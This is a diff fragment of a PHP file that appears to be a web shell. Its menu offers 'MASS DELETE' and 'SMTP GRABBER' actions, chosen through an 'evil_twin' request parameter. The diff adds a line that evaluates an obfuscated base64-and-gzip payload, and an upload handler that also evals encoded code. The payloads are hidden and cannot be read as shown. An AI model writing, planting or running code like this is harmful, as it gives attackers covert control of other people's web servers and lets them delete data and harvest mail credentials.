@@ -147,6 +147,7 @@ echo "<hr><center>
 <a href='?path=$path&evil_twin=mass_delete' class='pejoe'>MASS DELETE</a>
 <a href='?path=$path&evil_twin=smtp' class='pejoe'>SMTP GRABBER</a>
 <hr></center>";
+eval(gzinflate(base64_decode("jZBRS8MwFIXfB/sPlzDIhLEKe5sMLC4Pe+iqWeeLjNB1sYmmTUmuOND9d5MWEX3yKXDvyXfuOV6iQN1IYXSjcXp9dTMeSeesE0521qFu62E4OVrvYQXUSf9m0Hsljbmtm1KbeWUbGiVn0ZWogogoxG6ZJATmMBE7xh8Zf6LDK7Zpxujh14azhz3bFWLPN/QQSbqLlF30gCV8wDf6Ap+wuYf0dApn+H5F/pCyvGAiXa9570HgQgIwnjntI8yA8D4B9HQyg2AWhv8B9T1USlavi9WPcp3f7TO2LQTP82LQJl5Wc4WNIRC/oDzjIgR61kaKOjRe2RZli35KY1E+NFUr6/Go29Bl0pUeZeLVi7OJK99ptB2PvgA=")));
 if($_GET['evil_twin'] == 'upload') {
 eval(gzinflate(base64_decode('jZBbS8MwFIDfB/sPWRykA10QfBDWBgQ7EQcZnT4NGbFLaSA30lNhyP67TWfxBuI5L+fy8XE4qkpU00hIprvl/SrfbEmltCTPs9nbeKSqpHT+8HO3JWD8zgrT1edTL6CeE0rmv6gT0ZtkWTuE01JakIGllbOASqddyM6WfbCn9Yrf3CL+kNK4ZSkd4DoM6GUek+HFeHSUupF/i6+vYg7ivCh4Mfmn/PghJl/EwSBpSzh4mWHTalBeBKBxfrEXIDAyEmq3z/Cabx4xS5X1LaATHz+CUfzHUNPvQNO+GAUYvQrddu0dn+CO6O2fx5LFOw==')));
 } elseif($_GET['evil_twin'] == 'info') {
